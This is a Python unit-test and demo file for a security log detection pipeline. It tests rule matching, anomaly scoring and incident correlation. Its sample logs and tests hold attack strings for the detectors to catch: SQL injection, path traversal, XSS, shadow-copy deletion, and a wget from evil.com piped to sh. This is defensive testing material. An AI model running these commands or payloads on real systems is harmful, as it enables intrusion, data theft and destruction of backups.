"""
Secuintell — Test Suite & Demo Runner
======================================
Provides:
  • unit tests for each pipeline stage
  • a realistic end-to-end demo scenario
"""

import textwrap
import unittest
from datetime import datetime, timedelta

from detection_engine import (
    AnomalyDetector,
    CorrelationEngine,
    DetectionRule,
    Incident,
    LogEvent,
    RuleBasedDetector,
    SecuintellPipeline,
    Severity,
    _extract_features,
)

import re

# ===========================================================================
# SAMPLE LOG CORPUS
# ===========================================================================

def _ts(offset_minutes: int = 0) -> datetime:
    base = datetime(2025, 6, 1, 14, 0, 0)
    return base + timedelta(minutes=offset_minutes)


BASELINE_LOGS = [
    ("192.168.1.10", "User alice logged in successfully from 192.168.1.10", 0),
    ("192.168.1.11", "GET /api/users HTTP/1.1 200 1024 bytes", 1),
    ("192.168.1.12", "Health check OK uptime=99.9%", 2),
    ("10.0.0.5",     "User bob logout session closed", 3),
    ("10.0.0.6",     "Firewall deny inbound port 8080 from 203.0.113.5", 4),
    ("192.168.1.10", "User alice logged in successfully at 09:15", 5),
    ("192.168.1.20", "GET /index.html HTTP/1.1 200 512 bytes", 6),
    ("10.0.0.2",     "Service restart — nginx restarted after config reload", 7),
    ("192.168.1.30", "Accepted password for charlie from 192.168.1.30 sshd", 8),
    ("10.0.0.3",     "POST /api/data HTTP/1.1 201 256 bytes", 9),
]


ATTACK_SCENARIO_LOGS = [
    # ----- Attacker: 198.51.100.42 — full recon-to-compromise chain -----
    ("198.51.100.42", "nmap -sS -p 1-65535 scan detected from 198.51.100.42", 0),
    ("198.51.100.42", "Failed password for root from 198.51.100.42 sshd — authentication failure", 2),
    ("198.51.100.42", "Failed password for root from 198.51.100.42 sshd — authentication failure", 3),
    ("198.51.100.42", "Failed password for root from 198.51.100.42 sshd — authentication failure", 4),
    ("198.51.100.42", "GET /?id=1 UNION SELECT username,password FROM users HTTP/1.1 400", 5),
    ("198.51.100.42", "cmd.exe /c whoami & net user", 6),

    # ----- Exfiltration actor: 203.0.113.77 -----
    ("203.0.113.77",  "SELECT * INTO OUTFILE '/tmp/dump.csv' FROM customers", 10),
    ("203.0.113.77",  "bytes_sent=9500000 upload to 203.0.113.77", 11),

    # ----- Ransomware on internal host: 10.10.5.20 -----
    ("10.10.5.20",    "vssadmin delete shadows /all /quiet — shadow copy deletion", 20),
    ("10.10.5.20",    ".encrypt extension appended to files — ransomware indicator", 21),

    # ----- Noisy scanner: 172.16.254.1 -----
    ("172.16.254.1",  "User-Agent: sqlmap/1.7.8#stable", 30),
    ("172.16.254.1",  "GET /../../../etc/passwd HTTP/1.1 403", 30),
    ("172.16.254.1",  "GET /<script>alert(1)</script> HTTP/1.1 400", 31),

    # ----- Normal background noise -----
    ("192.168.1.10",  "User alice logged in successfully", 35),
    ("192.168.1.11",  "Health check OK", 36),
    ("192.168.1.12",  "GET /api/status HTTP/1.1 200 128 bytes", 37),
    ("10.0.0.5",      "User bob logout session closed", 38),
]


def make_events(log_defs: list[tuple]) -> list[LogEvent]:
    return [
        LogEvent(
            raw=msg,
            source_ip=ip,
            timestamp=_ts(offset),
        )
        for ip, msg, offset in log_defs
    ]


# ===========================================================================
# UNIT TESTS
# ===========================================================================

class TestRuleBasedDetector(unittest.TestCase):

    def setUp(self):
        self.detector = RuleBasedDetector()

    def test_sql_injection_critical(self):
        e = LogEvent(raw="GET /?id=1 UNION SELECT * FROM users HTTP/1.1")
        self.detector.analyze(e)
        self.assertEqual(e.severity, Severity.CRITICAL)
        self.assertIn("SQL_INJECTION", e.rule_matches)

    def test_brute_force_high(self):
        e = LogEvent(raw="Failed password for root sshd — authentication failure")
        self.detector.analyze(e)
        self.assertEqual(e.severity, Severity.HIGH)
        self.assertIn("BRUTE_FORCE_SSH", e.rule_matches)

    def test_scanner_medium(self):
        e = LogEvent(raw="User-Agent: sqlmap/1.7.8 scanning endpoint")
        self.detector.analyze(e)
        self.assertGreaterEqual(e.severity.score, Severity.MEDIUM.score)

    def test_normal_log_info(self):
        e = LogEvent(raw="User logged out session closed normally")
        self.detector.analyze(e)
        self.assertEqual(e.severity, Severity.INFO)

    def test_multiple_rules_highest_wins(self):
        e = LogEvent(raw="nmap scan; failed password for root sshd authentication failure; UNION SELECT")
        self.detector.analyze(e)
        self.assertEqual(e.severity, Severity.CRITICAL)
        self.assertTrue(len(e.rule_matches) >= 2)

    def test_rce_critical(self):
        e = LogEvent(raw="cmd.exe /c powershell wget http://evil.com/shell.ps1 | sh")
        self.detector.analyze(e)
        self.assertEqual(e.severity, Severity.CRITICAL)

    def test_ransomware_critical(self):
        e = LogEvent(raw="vssadmin delete shadows — ransomware .encrypt extension")
        self.detector.analyze(e)
        self.assertEqual(e.severity, Severity.CRITICAL)

    def test_custom_rule(self):
        custom = DetectionRule(
            name="CUSTOM_TOKEN",
            pattern=re.compile(r"supersecrettoken"),
            severity=Severity.HIGH,
            event_type="custom",
        )
        det = RuleBasedDetector(extra_rules=[custom])
        e = LogEvent(raw="request contained supersecrettoken in header")
        det.analyze(e)
        self.assertEqual(e.severity, Severity.HIGH)
        self.assertIn("CUSTOM_TOKEN", e.rule_matches)


class TestAnomalyDetector(unittest.TestCase):

    def setUp(self):
        self.baseline = make_events(BASELINE_LOGS)
        self.detector = AnomalyDetector(contamination=0.1, n_estimators=50)
        # Pre-run rules so features are meaningful
        rd = RuleBasedDetector()
        rd.analyze_batch(self.baseline)
        self.detector.fit(self.baseline)

    def test_fit_marks_fitted(self):
        self.assertTrue(self.detector._fitted)

    def test_scores_in_range(self):
        for e in self.detector.score_batch(list(self.baseline)):
            self.assertIsInstance(e.anomaly_score, float)

    def test_anomaly_bool_set(self):
        events = make_events(ATTACK_SCENARIO_LOGS[:5])
        RuleBasedDetector().analyze_batch(events)
        self.detector.score_batch(events)
        for e in events:
            self.assertIsInstance(e.is_anomaly, bool)

    def test_unfitted_raises(self):
        fresh = AnomalyDetector()
        with self.assertRaises(RuntimeError):
            fresh.score_batch([LogEvent(raw="test")])


class TestCorrelationEngine(unittest.TestCase):

    def setUp(self):
        self.engine = CorrelationEngine(
            ip_window_minutes=15,
            chain_window_minutes=60,
            anomaly_window_seconds=300,
            min_events_for_incident=2,
        )

    def test_ip_correlation(self):
        events = make_events([
            ("10.5.5.5", "Failed password sshd — authentication failure", 0),
            ("10.5.5.5", "Failed password sshd — authentication failure", 1),
            ("10.5.5.5", "UNION SELECT username FROM users", 5),
        ])
        RuleBasedDetector().analyze_batch(events)
        incidents = self.engine.correlate(events)
        ips_in_incidents = {ip for inc in incidents for ip in inc.source_ips}
        self.assertIn("10.5.5.5", ips_in_incidents)

    def test_anomaly_clustering(self):
        events = [
            LogEvent(raw="weird1", source_ip="5.5.5.5",
                     timestamp=_ts(0), is_anomaly=True, severity=Severity.HIGH),
            LogEvent(raw="weird2", source_ip="6.6.6.6",
                     timestamp=_ts(0) + timedelta(seconds=30), is_anomaly=True, severity=Severity.HIGH),
            LogEvent(raw="normal", source_ip="7.7.7.7",
                     timestamp=_ts(10), is_anomaly=False),
        ]
        incidents = self.engine.correlate(events)
        anomaly_incidents = [i for i in incidents if "anomaly" in i.tags]
        self.assertGreaterEqual(len(anomaly_incidents), 1)

    def test_no_incident_single_event(self):
        events = make_events([("9.9.9.9", "single suspicious event UNION SELECT", 0)])
        RuleBasedDetector().analyze_batch(events)
        incidents = self.engine.correlate(events)
        for inc in incidents:
            self.assertGreater(inc.event_count, 1)

    def test_incident_severity_upgrade(self):
        events = [
            LogEvent(raw="port scan nmap", source_ip="1.2.3.4",
                     timestamp=_ts(0), severity=Severity.HIGH),
            LogEvent(raw="SQL injection UNION SELECT FROM", source_ip="1.2.3.4",
                     timestamp=_ts(2), severity=Severity.CRITICAL),
        ]
        incidents = self.engine.correlate(events)
        if incidents:
            top_inc = max(incidents, key=lambda i: i.severity.score)
            self.assertEqual(top_inc.severity, Severity.CRITICAL)


class TestSecuintellPipeline(unittest.TestCase):

    def test_full_pipeline(self):
        pipeline = SecuintellPipeline(contamination=0.1)
        baseline = make_events(BASELINE_LOGS)
        pipeline.fit_anomaly_detector(baseline)

        events_in = make_events(ATTACK_SCENARIO_LOGS)
        events_out, incidents = pipeline.run(events_in)

        self.assertEqual(len(events_out), len(events_in))
        for e in events_out:
            self.assertIsNotNone(e.severity)
        self.assertIsInstance(incidents, list)

    def test_auto_fit(self):
        pipeline = SecuintellPipeline(contamination=0.1)
        events_in = make_events(ATTACK_SCENARIO_LOGS)
        events_out, incidents = pipeline.run(events_in, auto_fit=True)
        self.assertEqual(len(events_out), len(ATTACK_SCENARIO_LOGS))


# ===========================================================================
# DEMO RUNNER — pretty-printed report
# ===========================================================================

SEP = "═" * 72

def severity_badge(sev: Severity) -> str:
    colours = {
        Severity.INFO:     "\033[94m",   # blue
        Severity.LOW:      "\033[92m",   # green
        Severity.MEDIUM:   "\033[93m",   # yellow
        Severity.HIGH:     "\033[91m",   # red
        Severity.CRITICAL: "\033[1;91m", # bold red
    }
    reset = "\033[0m"
    return f"{colours[sev]}[{sev.value:8s}]{reset}"


def run_demo() -> None:
    print(f"\n{SEP}")
    print("  SECUINTELL  —  Security Intelligence Pipeline  —  Demo Run")
    print(f"{SEP}\n")

    # ── Build pipeline ────────────────────────────────────────────────────
    pipeline = SecuintellPipeline(
        contamination=0.15,
        ip_window_minutes=10,
        chain_window_minutes=60,
        anomaly_window_seconds=300,
        min_events_for_incident=2,
    )
    baseline_events = make_events(BASELINE_LOGS)
    pipeline.fit_anomaly_detector(baseline_events)
    print(f"  Baseline fitted on {len(baseline_events)} events.\n")

    # ── Process attack scenario ───────────────────────────────────────────
    raw_events = make_events(ATTACK_SCENARIO_LOGS)
    events, incidents = pipeline.run(raw_events)

    # ── Stage 1 report ───────────────────────────────────────────────────
    print(f"{'─' * 72}")
    print("  STAGE 1 — RULE-BASED DETECTION")
    print(f"{'─' * 72}")
    for e in events:
        badge   = severity_badge(e.severity)
        rules   = ", ".join(e.rule_matches) if e.rule_matches else "—"
        anomaly = "⚠ ANOMALY" if e.is_anomaly else ""
        log_preview = (e.raw[:58] + "…") if len(e.raw) > 60 else e.raw
        print(f"  {badge}  {log_preview}")
        print(f"           Rules: {rules}  Score: {e.anomaly_score:+.3f}  {anomaly}")
    print()

    # ── Stage 2 summary ──────────────────────────────────────────────────
    anomalies = [e for e in events if e.is_anomaly]
    print(f"{'─' * 72}")
    print(f"  STAGE 2 — ANOMALY DETECTION  ({len(anomalies)}/{len(events)} flagged)")
    print(f"{'─' * 72}")
    if anomalies:
        for a in anomalies:
            print(f"  ⚑  [{a.source_ip:>15s}]  score={a.anomaly_score:+.4f}  {a.raw[:55]}")
    else:
        print("  No anomalies detected.")
    print()

    # ── Stage 3 incidents ────────────────────────────────────────────────
    print(f"{'─' * 72}")
    print(f"  STAGE 3 — INCIDENTS  ({len(incidents)} generated)")
    print(f"{'─' * 72}")
    for inc in sorted(incidents, key=lambda i: i.severity.score, reverse=True):
        badge = severity_badge(inc.severity)
        print(f"\n  {badge}  {inc.incident_id}  —  {inc.title}")
        print(f"  Tags    : {', '.join(inc.tags)}")
        print(f"  Source  : {', '.join(inc.source_ips)}")
        if inc.affected_users:
            print(f"  Users   : {', '.join(inc.affected_users)}")
        print(f"  Events  : {inc.event_count}")
        print(f"  Summary : {inc.summary}")
        print(f"  Events  :")
        for e in inc.events:
            preview = (e.raw[:60] + "…") if len(e.raw) > 62 else e.raw
            print(f"            [{e.source_ip:>15s}]  {preview}")

    # ── Statistics ───────────────────────────────────────────────────────
    print(f"\n{SEP}")
    print("  SUMMARY STATISTICS")
    print(f"{SEP}")
    sev_counts: dict[Severity, int] = {s: 0 for s in Severity}
    for e in events:
        sev_counts[e.severity] += 1
    for sev in reversed(list(Severity)):
        bar = "█" * sev_counts[sev]
        print(f"  {severity_badge(sev)}  {sev_counts[sev]:3d}  {bar}")

    print(f"\n  Total events processed : {len(events)}")
    print(f"  Anomalies detected     : {len(anomalies)}")
    print(f"  Incidents generated    : {len(incidents)}")
    critical_inc = [i for i in incidents if i.severity == Severity.CRITICAL]
    print(f"  Critical incidents     : {len(critical_inc)}")
    print(f"{SEP}\n")


if __name__ == "__main__":
    import sys

    if "--test" in sys.argv or "-t" in sys.argv:
        # Run unit tests
        sys.argv = [sys.argv[0]]
        unittest.main(verbosity=2)
    else:
        run_demo()
        print("\nTo run unit tests:  python demo_and_tests.py --test\n")
